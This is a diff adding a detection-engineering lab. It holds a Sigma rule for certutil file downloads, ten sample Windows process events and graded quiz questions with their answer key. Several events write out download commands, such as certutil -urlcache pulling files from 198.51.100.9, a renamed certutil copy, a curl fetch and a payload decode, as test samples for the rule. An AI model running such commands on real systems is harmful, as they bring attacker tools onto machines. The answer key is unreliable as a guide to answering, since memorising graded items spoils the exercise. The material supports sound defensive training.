@@ -1,0 +1,99 @@
+slug: lab-de-sigma-matching
+lesson: de-sigma-rules
+title: Predict what a Sigma rule will match
+pass_mark: 80
+scenario: |
+  Before a detection goes live, a detection engineer checks it against known-good and known-bad
+  samples. You have a Sigma rule for certutil downloading files and ten process-creation events
+  from the test corpus.
+
+  Work through the rule by hand, as the SIEM would: every `selection_*` named in the condition
+  must match and the filter must not. Sigma's `contains` and `endswith` are **case-insensitive**
+  by default. In the JSON, backslashes are escaped (`\\` is one `\`).
+artifacts:
+- name: certutil_download.yml
+  kind: config
+  description: The Sigma rule under test.
+  content: |
+    title: Certutil Used to Download a File
+    id: 3f1c2b9e-6a1d-4f0e-9d4c-2b8a7e5c1f30
+    status: experimental
+    description: Detects certutil.exe fetching a remote file, a common ingress tool transfer technique.
+    logsource:
+      category: process_creation
+      product: windows
+    detection:
+      selection_img:
+        Image|endswith: '\certutil.exe'
+      selection_cli:
+        CommandLine|contains:
+          - '-urlcache'
+          - '/urlcache'
+      selection_remote:
+        CommandLine|contains: 'http'
+      filter_inventory:
+        ParentImage|endswith: '\InventoryAgent.exe'
+      condition: selection_img and selection_cli and selection_remote and not filter_inventory
+    level: high
+    tags:
+      - attack.command_and_control
+      - attack.t1105
+- name: process_events.jsonl
+  kind: json
+  description: Ten process-creation events (Sysmon event 1 fields), one per line.
+  content: |
+    {"RecordID": 101, "Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -urlcache -split -f http://198.51.100.9/a.txt C:\\Users\\Public\\a.txt", "ParentImage": "C:\\Windows\\System32\\cmd.exe"}
+    {"RecordID": 102, "Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -verify C:\\Certs\\server.cer", "ParentImage": "C:\\Windows\\explorer.exe"}
+    {"RecordID": 103, "Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe /urlcache /f https://files.example/tool.zip tool.zip", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}
+    {"RecordID": 104, "Image": "C:\\Program Files\\Contoso\\InventoryAgent.exe", "CommandLine": "InventoryAgent.exe --scan", "ParentImage": "C:\\Windows\\System32\\services.exe"}
+    {"RecordID": 105, "Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -urlcache -f http://crl.contoso.example/root.crl root.crl", "ParentImage": "C:\\Program Files\\Contoso\\InventoryAgent.exe"}
+    {"RecordID": 106, "Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -urlcache * delete", "ParentImage": "C:\\Windows\\System32\\cmd.exe"}
+    {"RecordID": 107, "Image": "C:\\Users\\Public\\cu.exe", "CommandLine": "cu.exe -urlcache -f http://198.51.100.9/b.txt b.txt", "ParentImage": "C:\\Windows\\System32\\cmd.exe"}
+    {"RecordID": 108, "Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -decode payload.b64 payload.dll", "ParentImage": "C:\\Windows\\System32\\cmd.exe"}
+    {"RecordID": 109, "Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -URLCACHE -f HTTP://198.51.100.9/c.txt c.txt", "ParentImage": "C:\\Windows\\System32\\cmd.exe"}
+    {"RecordID": 110, "Image": "C:\\Windows\\System32\\curl.exe", "CommandLine": "curl -o d.txt http://198.51.100.9/d.txt", "ParentImage": "C:\\Windows\\System32\\cmd.exe"}
+tasks:
+- prompt: Which RecordIDs does the rule match? List them separated by commas.
+  type: set
+  accepted:
+  - 101, 103, 109
+  hint: Check each event against all three selections, then apply the filter. Remember matching ignores case.
+  explanation: 101, 103 and 109 match. 102, 106 and 108 have no urlcache-and-http download; 104, 107 and 110 are
+    not certutil.exe; 105 is excluded by the InventoryAgent filter. 109 matches despite the capitals because Sigma
+    modifiers are case-insensitive.
+- prompt: How many events would match if the filter_inventory clause were removed?
+  type: number
+  accepted:
+  - '4'
+  hint: Which matching-shaped event does the filter currently exclude?
+  explanation: 'Four: the three true matches plus 105, the inventory agent fetching a CRL. That is the known false
+    positive the filter exists to remove.'
+- prompt: Which event is a real download the rule misses because the binary was renamed? Give its RecordID.
+  type: number
+  accepted:
+  - '107'
+  hint: Look for certutil's arguments run from an unexpected file name.
+  explanation: 107 runs certutil's -urlcache download from C:\Users\Public\cu.exe, a copied and renamed certutil.
+    Image|endswith misses it.
+- prompt: How would you make the rule catch the renamed copy?
+  type: choice
+  options:
+  - Add cu.exe to the Image list
+  - Match on OriginalFileName (CertUtil.exe) from the PE header as well as Image
+  - Remove the selection_remote clause
+  - Lower the rule level to medium
+  answer: 1
+  hint: What does Sysmon record about a binary that renaming does not change?
+  explanation: Sysmon records OriginalFileName from the file's version resource, which survives renaming. Matching
+    `Image|endswith` OR `OriginalFileName` closes the gap; adding one name just invites the next rename.
+- prompt: Which MITRE ATT&CK technique ID is this rule tagged with?
+  type: text
+  accepted:
+  - T1105
+  hint: Look at the tags block.
+  explanation: 'T1105 Ingress Tool Transfer: bringing tools or payloads into the environment, here with a signed
+    Windows binary.'
+  verify:
+    artifact: certutil_download.yml
+    op: set
+    pattern: attack\.(t\d{4})
